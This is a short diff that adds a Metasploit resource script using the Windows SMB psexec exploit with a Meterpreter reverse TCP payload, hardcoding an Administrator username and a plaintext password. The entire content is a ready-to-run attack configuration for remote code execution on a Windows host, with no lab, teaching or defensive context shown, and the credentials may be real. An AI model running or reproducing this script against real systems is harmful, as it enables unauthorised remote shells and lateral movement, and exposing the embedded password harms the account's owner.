@@ -1,0 +1,9 @@
+use exploit/windows/smb/psexec
+
+set payload  windows/meterpreter/reverse_tcp
+
+set SMBUSER Administrator
+
+set SMBPASS Domainctrl  @852456
+
+
